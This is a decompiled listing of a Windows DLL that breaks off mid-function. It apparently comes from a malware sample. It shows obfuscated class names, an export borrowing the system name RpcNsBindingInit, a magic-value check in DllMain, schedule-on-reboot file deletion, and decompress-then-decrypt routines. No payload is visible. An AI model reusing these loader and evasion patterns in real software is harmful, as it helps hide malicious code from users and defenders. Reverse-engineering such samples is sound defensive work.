CHAR String1[24] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
_UNKNOWN unk_10025ADC; // weak
_UNKNOWN unk_10025AE0; // weak
_UNKNOWN unk_10025C94; // weak
int dword_10026B98[15]; // weak
wchar_t word_10026BD4; // idb
int dword_10026C14; // weak
int dword_10026C18[4]; // weak
int dword_10026C28[4]; // weak
int dword_10026C38; // weak
int dword_10026C3C; // weak
int dword_10026C40; // weak
int dword_10026C44; // weak
int dword_10026C48; // weak
int dword_10026C4C; // weak
int dword_10026C50; // weak
int dword_10026C54; // weak
int dword_10026C58; // weak
int dword_10026C5C; // weak
int dword_10026C60; // weak
int dword_10026C64; // weak
int dword_10026C68; // weak
int dword_10026C6C; // weak
int dword_10026C70; // weak
int dword_10026C74; // weak
int dword_10026C78; // weak
int dword_10026C7C; // weak
int dword_10026C80; // weak
int dword_10026C84; // weak
int dword_10026C88; // weak
int dword_10026C8C; // weak
int dword_10026C90; // weak
int dword_10026C94; // weak
int dword_10026C98; // weak
int dword_10026C9C; // weak
int dword_10026CA0; // weak
int dword_10026CA4; // weak
int dword_10026CA8; // weak
int dword_10026CAC; // weak
int dword_10026CB0; // weak
int dword_10026CB4; // weak
int dword_10026CB8; // weak
int dword_10026CBC; // weak
int dword_10026CC0; // weak
int dword_10026CC4; // weak
int dword_10026CC8; // weak
int dword_10026CCC; // weak
int dword_10026CD0; // weak
int dword_10026CD4; // weak
int dword_10026CD8; // weak
int dword_10026CDC; // weak
int dword_10026CE0; // weak
int dword_10026CE4; // weak
LPCSTR dword_10026CE8; // idb
LPCSTR dword_10026CEC; // idb
int dword_10026CF0; // weak
LPCSTR lpLibFileName; // idb
LPCSTR dword_10026CF8; // idb
LPCSTR dword_10026CFC; // idb
LPCSTR dword_10026D00; // idb
LPCSTR lpModuleName; // idb
LPCSTR dword_10026D08; // idb
LPCSTR lpProcName; // idb
int dword_10026D10; // weak
int dword_10026D14; // weak
int dword_10026D18; // weak
int dword_10026D1C; // weak
int dword_10026D20; // weak
int dword_10026D24; // weak
int dword_10026D28; // weak
int dword_10026D2C; // weak
int dword_10026D30; // weak
int dword_10026D34; // weak
int dword_10026D38; // weak
int dword_10026D3C; // weak
int dword_10026D40; // weak
int dword_10026D44; // weak
int dword_10026D48; // weak
int dword_10026D4C; // weak
char byte_10026D50; // weak
int dword_10026D54[]; // weak
int dword_10026D60; // weak
char byte_10026D68[68004]; // weak
HMODULE dword_1003770C; // idb
HMODULE hModule; // idb
int (__stdcall *dword_10037714)(_DWORD); // weak
int (__stdcall *dword_10037718)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_1003771C)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_10037720)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_10037724)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_10037728)(_DWORD, _DWORD, _DWORD); // weak
LPCSTR dword_1003772C; // idb
int dword_10037730; // weak
int dword_10037734; // weak
_DWORD dword_1003774C[3]; // weak
int dword_10037A9C; // weak
int dword_10037AA8; // weak
int dword_10037F1C; // weak
int dword_10037F20; // weak
int dword_10037F24; // weak
int dword_100380D8; // weak
int dword_100380E4; // weak
int dword_100380E8; // weak
int dword_10038128; // weak
int dword_1003812C; // weak
int dword_10038130; // weak
int dword_10038134; // weak
int dword_10038138; // weak
int dword_10038224; // weak
int (__stdcall *dword_10038228)(_DWORD, _DWORD); // weak
int (__stdcall *dword_1003822C)(_DWORD, _DWORD); // weak
int dword_10038230; // weak
int dword_10038234; // weak
int dword_10038238; // weak
int dword_1003939C; // weak


//----- (10001000) --------------------------------------------------------
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  int v3; // ebp
  CHAR v5[264]; // [esp-110h] [ebp-110h] BYREF
  unsigned int v6; // [esp-8h] [ebp-8h]
  int v7; // [esp-4h] [ebp-4h] BYREF

  if ( lpvReserved == (LPVOID)-1330581491 )
    return 1;
  v7 = v3;
  v6 = (unsigned int)&v7 ^ dword_100249C0;
  dword_10025A80 = (int)hinstDLL;
  memset(v5, 0, 261);
  if ( fdwReason == 1 )
    GetModuleFileNameA(0, v5, 0x104u);
  return sub_1000DCB5((unsigned int)&v7 ^ v6);
}
// 10001000: could not find valid save-restore pair for ebp
// 10001015: variable 'v3' is possibly undefined
// 1000DCB5: using guessed type int __thiscall sub_1000DCB5(_DWORD);
// 100249C0: using guessed type int dword_100249C0;
// 10025A80: using guessed type int dword_10025A80;

//----- (10001077) --------------------------------------------------------
unsigned int RpcNsBindingInit()
{
  unsigned int result; // eax

  _set_se_translator(sub_100019F4);
  SetErrorMode(0x8001u);
  result = sub_10002538();
  if ( result >= 0x10 )
  {
    if ( (unsigned int)dword_10038234 >= 5 )
      MoveFileExW((LPCWSTR)(dword_10038230 + 8), 0, 4u);
    return sub_100022AB();
  }
  return result;
}
// 10002538: using guessed type int sub_10002538(void);
// 10038230: using guessed type int dword_10038230;
// 10038234: using guessed type int dword_10038234;

//----- (100010FC) --------------------------------------------------------
char __thiscall sub_100010FC(_DWORD *this)
{
  int v2; // eax
  _DWORD *v3; // esi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  _DWORD *v19; // eax
  int v20; // eax
  _DWORD *v21; // esi
  int v22; // eax
  int v23; // eax
  int v24; // eax
  _DWORD *v25; // eax
  _DWORD *v26; // eax
  void *Block; // [esp+10h] [ebp-74h] BYREF
  char v29[4]; // [esp+14h] [ebp-70h] BYREF
  char v30[4]; // [esp+18h] [ebp-6Ch] BYREF
  char v31[4]; // [esp+1Ch] [ebp-68h] BYREF
  char v32[4]; // [esp+20h] [ebp-64h] BYREF
  char v33[4]; // [esp+24h] [ebp-60h] BYREF
  char v34[4]; // [esp+28h] [ebp-5Ch] BYREF
  char v35[4]; // [esp+2Ch] [ebp-58h] BYREF
  char v36[4]; // [esp+30h] [ebp-54h] BYREF
  char v37[4]; // [esp+34h] [ebp-50h] BYREF
  char v38[4]; // [esp+38h] [ebp-4Ch] BYREF
  char v39[4]; // [esp+3Ch] [ebp-48h] BYREF
  char v40[4]; // [esp+40h] [ebp-44h] BYREF
  char v41[4]; // [esp+44h] [ebp-40h] BYREF
  char v42[4]; // [esp+48h] [ebp-3Ch] BYREF
  char v43[4]; // [esp+4Ch] [ebp-38h] BYREF
  char v44[4]; // [esp+50h] [ebp-34h] BYREF
  char v45[4]; // [esp+54h] [ebp-30h] BYREF
  char v46[4]; // [esp+58h] [ebp-2Ch] BYREF
  char v47[4]; // [esp+5Ch] [ebp-28h] BYREF
  char v48[4]; // [esp+60h] [ebp-24h] BYREF
  char v49[4]; // [esp+64h] [ebp-20h] BYREF
  char v50[4]; // [esp+68h] [ebp-1Ch] BYREF
  _DWORD *v51; // [esp+6Ch] [ebp-18h] BYREF
  char pExceptionObject[16]; // [esp+70h] [ebp-14h] BYREF
  int v53; // [esp+80h] [ebp-4h]

  v53 = 1;
  Block = operator new(0x10u);
  if ( Block )
    v2 = sub_1000B745();
  else
    v2 = 0;
  LOBYTE(v53) = 0;
  if ( !v2 )
  {
    sub_1000D6CF(pExceptionObject);
    _CxxThrowException(pExceptionObject, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v3 = this + 1;
  v51 = (_DWORD *)v2;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(this[1] + 8))(this + 1, &v51);
  Block = operator new(0x1C78u);
  LOBYTE(v53) = 2;
  if ( Block )
    v4 = sub_1000B66B();
  else
    v4 = 0;
  LOBYTE(v53) = 0;
  if ( !v4 )
  {
    sub_1000D6CF(v50);
    _CxxThrowException(v50, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v4;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x6478u);
  LOBYTE(v53) = 3;
  if ( Block )
    v5 = sub_100097F3(0);
  else
    v5 = 0;
  LOBYTE(v53) = 0;
  if ( !v5 )
  {
    sub_1000D6CF(v49);
    _CxxThrowException(v49, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v5;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x120u);
  LOBYTE(v53) = 4;
  if ( Block )
    v6 = sub_100094DA();
  else
    v6 = 0;
  LOBYTE(v53) = 0;
  if ( !v6 )
  {
    sub_1000D6CF(v48);
    _CxxThrowException(v48, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v6;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x9614u);
  LOBYTE(v53) = 5;
  if ( Block )
    v7 = sub_1000747A(0);
  else
    v7 = 0;
  LOBYTE(v53) = 0;
  if ( !v7 )
  {
    sub_1000D6CF(v47);
    _CxxThrowException(v47, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v7;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x164u);
  LOBYTE(v53) = 6;
  if ( Block )
    v8 = sub_10007377();
  else
    v8 = 0;
  LOBYTE(v53) = 0;
  if ( !v8 )
  {
    sub_1000D6CF(v46);
    _CxxThrowException(v46, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v8;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x5B8u);
  LOBYTE(v53) = 7;
  if ( Block )
    v9 = sub_10007107();
  else
    v9 = 0;
  LOBYTE(v53) = 0;
  if ( !v9 )
  {
    sub_1000D6CF(v45);
    _CxxThrowException(v45, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v9;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x2274u);
  LOBYTE(v53) = 8;
  if ( Block )
    v10 = sub_10006E4B();
  else
    v10 = 0;
  LOBYTE(v53) = 0;
  if ( !v10 )
  {
    sub_1000D6CF(v44);
    _CxxThrowException(v44, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v10;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x47A4u);
  LOBYTE(v53) = 9;
  if ( Block )
    v11 = sub_10005C3D(0);
  else
    v11 = 0;
  LOBYTE(v53) = 0;
  if ( !v11 )
  {
    sub_1000D6CF(v43);
    _CxxThrowException(v43, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v11;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x268u);
  LOBYTE(v53) = 10;
  if ( Block )
    v12 = sub_10005A67();
  else
    v12 = 0;
  LOBYTE(v53) = 0;
  if ( !v12 )
  {
    sub_1000D6CF(v42);
    _CxxThrowException(v42, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v12;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x1A0u);
  LOBYTE(v53) = 11;
  if ( Block )
    v13 = sub_1000590B();
  else
    v13 = 0;
  LOBYTE(v53) = 0;
  if ( !v13 )
  {
    sub_1000D6CF(v41);
    _CxxThrowException(v41, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v13;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0xB658u);
  LOBYTE(v53) = 12;
  if ( Block )
    v14 = sub_10003E73();
  else
    v14 = 0;
  LOBYTE(v53) = 0;
  if ( !v14 )
  {
    sub_1000D6CF(v40);
    _CxxThrowException(v40, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v14;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x79F0u);
  LOBYTE(v53) = 13;
  if ( Block )
    v15 = sub_100039B1();
  else
    v15 = 0;
  LOBYTE(v53) = 0;
  if ( !v15 )
  {
    sub_1000D6CF(v39);
    _CxxThrowException(v39, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v15;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x14u);
  LOBYTE(v53) = 14;
  if ( Block )
    v16 = sub_1000381D();
  else
    v16 = 0;
  LOBYTE(v53) = 0;
  if ( !v16 )
  {
    sub_1000D6CF(v38);
    _CxxThrowException(v38, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v16;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x54u);
  LOBYTE(v53) = 15;
  if ( Block )
    v17 = sub_10003566(0);
  else
    v17 = 0;
  LOBYTE(v53) = 0;
  if ( !v17 )
  {
    sub_1000D6CF(v37);
    _CxxThrowException(v37, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v17;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  Block = operator new(0x1Cu);
  LOBYTE(v53) = 16;
  if ( Block )
    v18 = sub_10003487();
  else
    v18 = 0;
  LOBYTE(v53) = 0;
  if ( !v18 )
  {
    sub_1000D6CF(v36);
    _CxxThrowException(v36, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v18;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v3 + 8))(this + 1, &v51);
  v19 = operator new(4u);
  if ( v19 )
    *v19 = &FjooPyswdq::`vftable';
  else
    v19 = 0;
  if ( !v19 )
  {
    sub_1000D6CF(v35);
    _CxxThrowException(v35, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = v19;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(this[13] + 8))(this + 13, &v51);
  Block = operator new(0x20u);
  LOBYTE(v53) = 17;
  if ( Block )
    v20 = sub_10003324(315000);
  else
    v20 = 0;
  LOBYTE(v53) = 0;
  if ( !v20 )
  {
    sub_1000D6CF(v34);
    _CxxThrowException(v34, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v21 = this + 5;
  v51 = (_DWORD *)v20;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(this[5] + 8))(this + 5, &v51);
  Block = operator new(0x10u);
  LOBYTE(v53) = 18;
  if ( Block )
    v22 = sub_10002D6C();
  else
    v22 = 0;
  LOBYTE(v53) = 0;
  if ( !v22 )
  {
    sub_1000D6CF(v33);
    _CxxThrowException(v33, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v22;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v21 + 8))(this + 5, &v51);
  Block = operator new(0x4BCu);
  LOBYTE(v53) = 19;
  if ( Block )
    v23 = sub_10002BAB();
  else
    v23 = 0;
  LOBYTE(v53) = 0;
  if ( !v23 )
  {
    sub_1000D6CF(v32);
    _CxxThrowException(v32, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v23;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v21 + 8))(this + 5, &v51);
  Block = operator new(0xACu);
  LOBYTE(v53) = 20;
  if ( Block )
    v24 = sub_10002AB9();
  else
    v24 = 0;
  LOBYTE(v53) = 0;
  if ( !v24 )
  {
    sub_1000D6CF(v31);
    _CxxThrowException(v31, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = (_DWORD *)v24;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(*v21 + 8))(this + 5, &v51);
  v25 = operator new(4u);
  if ( v25 )
    *v25 = &MjsYbbJrrfdy::`vftable';
  else
    v25 = 0;
  if ( !v25 )
  {
    sub_1000D6CF(v30);
    _CxxThrowException(v30, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v51 = v25;
  (*(void (__thiscall **)(_DWORD *, _DWORD **))(this[21] + 8))(this + 21, &v51);
  v26 = operator new(4u);
  if ( v26 )
    *v26 = &FjooPyswdq::`vftable';
  else
    v26 = 0;
  if ( !v26 )
  {
    sub_1000D6CF(v29);
    _CxxThrowException(v29, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  Block = v26;
  (*(void (__thiscall **)(_DWORD *, void **))(this[21] + 8))(this + 21, &Block);
  return 1;
}
// 10002AB9: using guessed type int sub_10002AB9(void);
// 10002BAB: using guessed type int sub_10002BAB(void);
// 10002D6C: using guessed type int sub_10002D6C(void);
// 10003324: using guessed type _DWORD __stdcall sub_10003324(_DWORD);
// 10003487: using guessed type int sub_10003487(void);
// 10003566: using guessed type _DWORD __stdcall sub_10003566(char);
// 1000381D: using guessed type int sub_1000381D(void);
// 100039B1: using guessed type int sub_100039B1(void);
// 10003E73: using guessed type int sub_10003E73(void);
// 1000590B: using guessed type int sub_1000590B(void);
// 10005A67: using guessed type int sub_10005A67(void);
// 10005C3D: using guessed type _DWORD __stdcall sub_10005C3D(char);
// 10006E4B: using guessed type int sub_10006E4B(void);
// 10007107: using guessed type int sub_10007107(void);
// 10007377: using guessed type int sub_10007377(void);
// 1000747A: using guessed type _DWORD __stdcall sub_1000747A(char);
// 100094DA: using guessed type int sub_100094DA(void);
// 100097F3: using guessed type _DWORD __stdcall sub_100097F3(char);
// 1000B745: using guessed type int sub_1000B745(void);
// 1000D6CF: using guessed type int __thiscall sub_1000D6CF(_DWORD);
// 1001B2D0: using guessed type void *MjsYbbJrrfdy::`vftable';
// 1001B2DC: using guessed type void *FjooPyswdq::`vftable';
// 100010FC: using guessed type char var_1C[4];
// 100010FC: using guessed type char var_20[4];
// 100010FC: using guessed type char var_24[4];
// 100010FC: using guessed type char var_28[4];
// 100010FC: using guessed type char var_2C[4];
// 100010FC: using guessed type char var_30[4];
// 100010FC: using guessed type char var_34[4];
// 100010FC: using guessed type char var_38[4];
// 100010FC: using guessed type char var_3C[4];
// 100010FC: using guessed type char var_40[4];
// 100010FC: using guessed type char var_44[4];
// 100010FC: using guessed type char var_48[4];
// 100010FC: using guessed type char var_4C[4];
// 100010FC: using guessed type char var_50[4];
// 100010FC: using guessed type char var_54[4];
// 100010FC: using guessed type char var_58[4];
// 100010FC: using guessed type char var_5C[4];
// 100010FC: using guessed type char var_60[4];
// 100010FC: using guessed type char var_64[4];
// 100010FC: using guessed type char var_68[4];
// 100010FC: using guessed type char var_6C[4];
// 100010FC: using guessed type char var_70[4];

//----- (100017B3) --------------------------------------------------------
_DWORD *__thiscall sub_100017B3(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = this;
  *this = &sr::Snsziibtx::`vftable';
  return result;
}
// 1001B2E8: using guessed type void *sr::Snsziibtx::`vftable';

//----- (100017BE) --------------------------------------------------------
void *__thiscall sub_100017BE(void *Block, char a2)
{
  sub_1000D6C8();
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1000D6C8: using guessed type int sub_1000D6C8(void);

//----- (100017DA) --------------------------------------------------------
_DWORD *__thiscall sub_100017DA(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = this;
  *this = &sr::GfnpwoMadjdwvkl::`vftable';
  return result;
}
// 1001B2F0: using guessed type void *sr::GfnpwoMadjdwvkl::`vftable';

//----- (100017E5) --------------------------------------------------------
void *__thiscall sub_100017E5(void *Block, char a2)
{
  sub_1000D6DD();
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1000D6DD: using guessed type int sub_1000D6DD(void);

//----- (10001801) --------------------------------------------------------
char __stdcall sub_10001801(void *a1, size_t a2, size_t *a3)
{
  void *v3; // esi
  void *v4; // eax
  size_t v5; // esi
  void *v6; // eax
  const void *v7; // edi
  size_t v8; // eax
  void *v10; // [esp-Ch] [ebp-60h]
  char pExceptionObject[4]; // [esp+10h] [ebp-44h] BYREF
  char v12[4]; // [esp+14h] [ebp-40h] BYREF
  char v13[4]; // [esp+18h] [ebp-3Ch] BYREF
  char v14[4]; // [esp+1Ch] [ebp-38h] BYREF
  size_t *v15; // [esp+20h] [ebp-34h]
  char v16[4]; // [esp+24h] [ebp-30h] BYREF
  char v17[4]; // [esp+28h] [ebp-2Ch] BYREF
  char v18[4]; // [esp+2Ch] [ebp-28h] BYREF
  void *v19; // [esp+30h] [ebp-24h]
  void *v20; // [esp+34h] [ebp-20h]
  size_t v21; // [esp+38h] [ebp-1Ch] BYREF
  void *Block; // [esp+3Ch] [ebp-18h]
  char v23; // [esp+43h] [ebp-11h]
  int v24; // [esp+50h] [ebp-4h]
  char v25[260]; // [esp+54h] [ebp+0h] BYREF

  v19 = a1;
  v15 = a3;
  Block = 0;
  v20 = 0;
  v24 = 0;
  if ( sub_1000C026(4224, 2, 4, 4, 4, 4, 4, 4, 4, 4) )
  {
    sub_1000D6BF(pExceptionObject);
    _CxxThrowException(pExceptionObject, &_TI1_AVSnsziibtx_sr__);
  }
  v21 = (a2 >> 6) + a2 + 19;
  v3 = operator new(v21);
  Block = v3;
  if ( !v3 )
  {
    sub_1000D6CF(v18);
    _CxxThrowException(v18, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v4 = operator new(0x10000u);
  v20 = v4;
  if ( !v4 )
  {
    sub_1000D6CF(v16);
    _CxxThrowException(v16, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  if ( sub_1000BDFF(v19, a2, v3, &v21, v4) )
  {
    sub_1000D6BF(v12);
    _CxxThrowException(v12, &_TI1_AVSnsziibtx_sr__);
  }
  sub_1000B8B0(v25, &unk_1001B28C, 16);
  sub_1000B915(v25, v3, v21);
  v5 = 2 * v21;
  v6 = operator new(2 * v21);
  v7 = v6;
  if ( !v6 )
  {
    sub_1000D6CF(v14);
    _CxxThrowException(v14, &_TI2_AVGfnpwoMadjdwvkl_sr__);
  }
  v8 = sub_1000B7BA(v6, Block, v21, v5);
  if ( v8 == -1 )
  {
    sub_1000D6BF(v17);
    _CxxThrowException(v17, &_TI1_AVSnsziibtx_sr__);
  }
  if ( v8 > a2 )
  {
    sub_1000D6BF(v13);
    _CxxThrowException(v13, &_TI1_AVSnsziibtx_sr__);
  }
  v10 = v19;
  *v15 = v8;
  memcpy(v10, v7, v8);
  v23 = 1;
  if ( Block )
    j_j__free(Block);
  if ( v20 )
    j_j__free(v20);
  return v23;
}
// 1000B7BA: using guessed type _DWORD __cdecl sub_1000B7BA(_DWORD, _DWORD, _DWORD, _DWORD);
// 1000B8B0: using guessed type _DWORD __cdecl sub_1000B8B0(_DWORD, _DWORD, _DWORD);
// 1000B915: using guessed type _DWORD __cdecl sub_1000B915(_DWORD, _DWORD, _DWORD);
// 1000BDFF: using guessed type _DWORD __cdecl sub_1000BDFF(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000C026: using guessed type _DWORD __cdecl sub_1000C026(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000D6BF: using guessed type int __thiscall sub_1000D6BF(_DWORD);
// 1000D6CF: using guessed type int __thiscall sub_1000D6CF(_DWORD);
// 10001801: using guessed type char pExceptionObject[4];
// 10001801: using guessed type char var_130[4];
// 10001801: using guessed type char var_138[4];
// 10001801: using guessed type char var_148[4];
// 10001801: using guessed type char var_140[4];
// 10001801: using guessed type char var_134[4];
// 10001801: using guessed type char var_144[4];

//----- (100019F4) --------------------------------------------------------
void __thiscall __noreturn sub_100019F4(void *this)
{
  void *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  ((void (__thiscall *)(void **))sub_1000D6E8)(&pExceptionObject);
  _CxxThrowException(&pExceptionObject, &_TI2_AVHfpmmmiamaHpnxxaqhf_sr__);
}
// 1000D6E8: using guessed type int __thiscall sub_1000D6E8(_DWORD, _DWORD);

//----- (10001A0F) --------------------------------------------------------
_DWORD *__thiscall sub_10001A0F(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = this;
  *this = &sr::HfpmmmiamaHpnxxaqhf::`vftable';
  return result;
}
// 1001B2F8: using guessed type void *sr::HfpmmmiamaHpnxxaqhf::`vftable';

//----- (10001A1A) --------------------------------------------------------
void *__thiscall sub_10001A1A(void *Block, char a2)
{
  sub_1000D6F6();
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1000D6F6: using guessed type int sub_1000D6F6(void);

//----- (10001A36) --------------------------------------------------------
void __thiscall sub_10001A36(_DWORD *this)
{
  this[1] = 0;
  this[2] = 16;
  *this = &mm::data::List<BVzrxdlmeb *>::`vftable';
  this[3] = operator new(0x40u);
}
// 1001B304: using guessed type void *mm::data::List<BVzrxdlmeb *>::`vftable';

//----- (10001A65) --------------------------------------------------------
void __thiscall sub_10001A65(_DWORD *this)
{
  void *v2; // [esp-4h] [ebp-8h]

  v2 = (void *)this[3];
  *this = &mm::data::List<BVzrxdlmeb *>::`vftable';
  j_j__free(v2);
  this[3] = 0;
}
// 1001B304: using guessed type void *mm::data::List<BVzrxdlmeb *>::`vftable';

//----- (10001A7D) --------------------------------------------------------
int __thiscall sub_10001A7D(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // ebx
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != ((int (*)(void))sub_10002E1A)() )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a3, &unk_1001B28B);
  v4 = *this;
  v5 = sub_10002E1A(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 24))(this, v5 + 1);
  for ( i = sub_10002E1A(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);

//----- (10001ADA) --------------------------------------------------------
int __thiscall sub_10001ADA(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  int result; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001B29D);
  --this[1];
  while ( v2 < sub_10002E1A(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  result = sub_10002E1A(this);
  *(_DWORD *)(this[3] + 4 * result) = 0;
  return result;
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);

//----- (10001B1C) --------------------------------------------------------
int __thiscall sub_10001B1C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001B29E);
  return this[3] + 4 * a2;
}

//----- (10001B3A) --------------------------------------------------------
int __thiscall sub_10001B3A(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 52))(this, a2, &unk_1001B29F);
  return this[3] + 4 * a2;
}

//----- (10001B58) --------------------------------------------------------
void __thiscall sub_10001B58(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 60))(this, this[1], v2, a2);
    j_j__free(v2);
  }
}

//----- (10001B7A) --------------------------------------------------------
BOOL __thiscall sub_10001B7A(void *this)
{
  return sub_10002E1A(this) == 0;
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);

//----- (10001B85) --------------------------------------------------------
unsigned int __thiscall sub_10001B85(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 52))(this, a2, &unk_1001B2A0);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 24))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 24))(a4, this[1] - a2);
  v5 = 0;
  result = sub_10002E1A(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 8))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 8))(a3, this[3] + 4 * v5);
      ++v5;
      result = sub_10002E1A(this);
    }
    while ( v5 < result );
  }
  return result;
}
// 10002E1A: using guessed type int __thiscall sub_10002E1A(_DWORD);

//----- (10001BF7) --------------------------------------------------------
unsigned int __thiscall sub_10001BF7(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = sub_10002E1A(this);
  if ( pExceptionObject >= result )
  {
    sub_1000D701(&pExceptionObject);
